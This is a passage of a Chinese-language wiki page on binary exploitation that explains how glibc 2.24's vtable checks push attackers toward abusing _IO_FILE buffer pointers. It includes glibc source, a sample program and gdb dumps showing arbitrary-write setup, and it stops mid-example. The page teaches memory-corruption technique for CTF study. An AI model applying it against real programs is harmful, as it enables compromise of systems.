@@ -1,0 +1,883 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="SkYe Wiki">
+      
+      
+      
+        <meta name="author" content="SkYe231">
+      
+      
+        <link rel="canonical" href="https://wiki.mrskye.cn/Pwn/IO_FILE/glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/">
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.4">
+    
+    
+      
+        <title>glibc 2.24 下 IO_FILE 的利用 - SkYe Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.15aa0b43.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.75751829.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ffffff">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
+        <style>body,input{font-family:"Noto Sans",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+        
+<script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-36723568-3","wiki.mrskye.cn"),ga("set","anonymizeIp",!0),ga("send","pageview"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){if(this.value){var e=document.location.pathname;ga("send","pageview",e+"?q="+this.value)}})}),document.addEventListener("DOMContentSwitch",function(){ga("send","pageview",document.location.pathname)})</script>
+<script async src="https://www.google-analytics.com/analytics.js"></script>
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="green">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#glibc-224-io_file" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-header-nav__button md-logo" aria-label="SkYe Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            SkYe Wiki
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              glibc 2.24 下 IO_FILE 的利用
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header-nav__source">
+        
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-nav__button md-logo" aria-label="SkYe Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    SkYe Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1" >
+    
+    <label class="md-nav__link" for="nav-1">
+      Pwn
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        <span class="md-nav__icon md-icon"></span>
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-1" type="checkbox" id="nav-1-1" >
+    
+    <label class="md-nav__link" for="nav-1-1">
+      格式化字符串
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="格式化字符串" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-1">
+        <span class="md-nav__icon md-icon"></span>
+        格式化字符串
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/" class="md-nav__link">
+      格式化字符串漏洞基础例子
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/" class="md-nav__link">
+      格式化字符串漏洞基础利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/" class="md-nav__link">
+      格式化字符串盲打
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    介绍
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    新的利用技术
+  </a>
+  
+    <nav class="md-nav" aria-label="新的利用技术">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fileno" class="md-nav__link">
+    fileno 与缓冲区的相关利用
+  </a>
+  
+    <nav class="md-nav" aria-label="fileno 与缓冲区的相关利用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    示例
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_io_str_jumps-overflow" class="md-nav__link">
+    _IO_str_jumps -&gt; overflow
+  </a>
+  
+    <nav class="md-nav" aria-label="_IO_str_jumps -&gt; overflow">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    示例
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_io_str_jumps-finish" class="md-nav__link">
+    _IO_str_jumps -&gt; finish
+  </a>
+  
+    <nav class="md-nav" aria-label="_IO_str_jumps -&gt; finish">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    示例
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/skyedai910/wiki.mrskye.cn/blob/master/docs/Pwn/IO_FILE/glibc2.24下IO_FILE的利用.md" title="编辑此页" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                <h1 id="glibc-224-io_file">glibc 2.24 下 IO_FILE 的利用<a class="headerlink" href="#glibc-224-io_file" title="Permanent link">&para;</a></h1>
+<h2 id="_1">介绍<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。</p>
+<div class="highlight"><pre><span></span><code><span class="cm">/* Check if unknown vtable pointers are permitted; otherwise,</span>
+<span class="cm">   terminate the process.  */</span>
+<span class="kt">void</span> <span class="nf">_IO_vtable_check</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">attribute_hidden</span><span class="p">;</span>
+<span class="cm">/* Perform vtable pointer validation.  If validation fails, terminate</span>
+<span class="cm">   the process.  */</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="k">const</span> <span class="k">struct</span> <span class="nc">_IO_jump_t</span> <span class="o">*</span>
+<span class="n">IO_validate_vtable</span> <span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="nc">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="cm">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span>
+<span class="cm">     section.  */</span>
+  <span class="kt">uintptr_t</span> <span class="n">section_length</span> <span class="o">=</span> <span class="n">__stop___libc_IO_vtables</span> <span class="o">-</span> <span class="n">__start___libc_IO_vtables</span><span class="p">;</span>
+  <span class="kt">uintptr_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">vtable</span><span class="p">;</span>
+  <span class="kt">uintptr_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">-</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">__start___libc_IO_vtables</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">offset</span> <span class="o">&gt;=</span> <span class="n">section_length</span><span class="p">))</span>
+    <span class="cm">/* The vtable pointer is not in the expected section.  Use the</span>
+<span class="cm">       slow path, which will terminate the process if necessary.  */</span>
+    <span class="n">_IO_vtable_check</span> <span class="p">();</span>
+  <span class="k">return</span> <span class="n">vtable</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>计算 <code>section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</code>，紧接着会判断 vtable - __start___libc_IO_vtables 的 offset ，如果这个 offset 大于 section_length , 即大于 <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> 那么就会调用 <code>_IO_vtable_check()</code> 这个函数。</p>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="n">attribute_hidden</span>
+<span class="n">_IO_vtable_check</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="cp">#ifdef SHARED</span>
+  <span class="cm">/* Honor the compatibility flag.  */</span>
+  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">flag</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="o">=</span> <span class="n">atomic_load_relaxed</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">IO_accept_foreign_vtables</span><span class="p">);</span>
+<span class="cp">#ifdef PTR_DEMANGLE</span>
+  <span class="n">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">flag</span><span class="p">);</span>
+<span class="cp">#endif</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">flag</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">_IO_vtable_check</span><span class="p">)</span>
+    <span class="k">return</span><span class="p">;</span>
+
+  <span class="cm">/* In case this libc copy is in a non-default namespace, we always</span>
+<span class="cm">     need to accept foreign vtables because there is always a</span>
+<span class="cm">     possibility that FILE * objects are passed across the linking</span>
+<span class="cm">     boundary.  */</span>
+  <span class="p">{</span>
+    <span class="n">Dl_info</span> <span class="n">di</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="nc">link_map</span> <span class="o">*</span><span class="n">l</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">_dl_open_hook</span> <span class="o">!=</span> <span class="nb">NULL</span>
+        <span class="o">||</span> <span class="p">(</span><span class="n">_dl_addr</span> <span class="p">(</span><span class="n">_IO_vtable_check</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">di</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">l</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span>
+            <span class="o">&amp;&amp;</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_ns</span> <span class="o">!=</span> <span class="n">LM_ID_BASE</span><span class="p">))</span>
+      <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+
+<span class="cp">#else </span><span class="cm">/* !SHARED */</span><span class="cp"></span>
+  <span class="cm">/* We cannot perform vtable validation in the static dlopen case</span>
+<span class="cm">     because FILE * handles might be passed back and forth across the</span>
+<span class="cm">     boundary.  Therefore, we disable checking in this case.  */</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">__dlopen</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="cp">#endif</span>
+
+  <span class="n">__libc_fatal</span> <span class="p">(</span><span class="s">&quot;Fatal error: glibc detected an invalid stdio handle</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>如果 vtable 是非法的，那么会引发 abort。</p>
+<p>这里的检查使得以往使用 vtable 进行利用的技术很难实现</p>
+<h2 id="_2">新的利用技术<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h3 id="fileno">fileno 与缓冲区的相关利用<a class="headerlink" href="#fileno" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>劫持 _IO_FILE  结构体的 <code>_IO_buf_base</code>和<code>_IO_buf_end</code> 实现任意地址写</p>
+</blockquote>
+<p>在 vtable 难以被利用之后，利用的关注点从 vtable 转移到_IO_FILE 结构内部的域中。 前面介绍过_IO_FILE 在使用标准 IO 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如 fwrite、fread 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。</p>
+<div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">_IO_FILE</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>       <span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>
+  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
+  <span class="cm">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_ptr</span><span class="p">;</span>   <span class="cm">/* Current read pointer */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_end</span><span class="p">;</span>   <span class="cm">/* End of get area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_base</span><span class="p">;</span>  <span class="cm">/* Start of putback+get area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_base</span><span class="p">;</span> <span class="cm">/* Start of put area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_ptr</span><span class="p">;</span>  <span class="cm">/* Current put pointer. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_end</span><span class="p">;</span>  <span class="cm">/* End of put area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_base</span><span class="p">;</span>   <span class="cm">/* Start of reserve area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_end</span><span class="p">;</span>    <span class="cm">/* End of reserve area. */</span>
+  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>
+
+  <span class="k">struct</span> <span class="nc">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>
+
+  <span class="k">struct</span> <span class="nc">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>
+
+  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
+  <span class="n">_IO_off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it&#39;s too small.  */</span>
+<span class="p">};</span>
+</code></pre></div>
+<p>因为进程中包含了系统默认的三个文件流 stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过 scanf\printf 一样可以进行利用。</p>
+<p>在_IO_FILE 中_IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p>
+<h4 id="_3">示例<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h4>
+<p>简单的观察一下_IO_FILE 对于调用 scanf 的作用</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&quot;stdio.h&quot;</span><span class="cp"></span>
+
+<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+ <span class="kt">char</span> <span class="n">stack_buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+ <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span><span class="n">stack_buf</span><span class="p">);</span>
+ <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span><span class="n">stack_buf</span><span class="p">);</span>
+
+<span class="p">}</span>
+</code></pre></div>
+<p>在执行程序第一次使用 stdin 之前，stdin 的内容还未初始化是空的</p>
+<div class="highlight"><pre><span></span><code>0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2088  0x0000000000000000
+0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff
+0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790
+0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000
+0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000
+0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000
+0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x0000000000000000  0x0000000000000000
+0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0 &lt;== vtable
+</code></pre></div>
+<p>调用 scanf 之后可以看到_IO_read_ptr、_IO_read_base、_IO_read_end、_IO_buf_base、_IO_buf_end 等域都被初始化</p>
+<div class="highlight"><pre><span></span><code>0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2288  0x0000000000602013
+0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000602014  0x0000000000602010
+0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000602010  0x0000000000602010
+0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000602010  0x0000000000602010
+0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x0000000000602410  0x0000000000000000
+0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff
+0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790
+0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000
+0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000
+0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000
+0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff  0x0000000000000000
+0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0
+</code></pre></div>
+<p>进一步思考可以发现其实 stdin 初始化的内存是在堆上分配出来的，在这里堆的基址是 0x602000，因为之前没有堆分配因此缓冲区的地址也是 0x602010</p>
+<div class="highlight"><pre><span></span><code>Start              End                Offset             Perm Path
+0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/1/t1
+0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/1/t1
+0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/1/t1
+0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
+</code></pre></div>
+<p>分配的堆大小是 0x400 个字节，正好对应于_IO_buf_base～_IO_buf_end 在进行写入后，可以看到缓冲区中有我们写入的数据，之后目的地址栈中的缓冲区也会写入数据</p>
+<div class="highlight"><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000411 &lt;== 分配0x400大小
+0x602010:   0x000000000a333231  0x0000000000000000 &lt;== 缓冲数据
+0x602020:   0x0000000000000000  0x0000000000000000
+0x602030:   0x0000000000000000  0x0000000000000000
+0x602040:   0x0000000000000000  0x0000000000000000
+</code></pre></div>
+<p>接下来我们尝试修改_IO_buf_base 来实现任意地址读写，全局缓冲区 buf 的地址是 0x7ffff7dd2740。修改_IO_buf_base 和_IO_buf_end 到缓冲区 buf 的地址</p>
+<div class="highlight"><pre><span></span><code>0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2288  0x0000000000602013
+0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000602014  0x0000000000602010
+0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000602010  0x0000000000602010
+0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000602010  0x00007ffff7dd2740 &lt;== _IO_buf_base
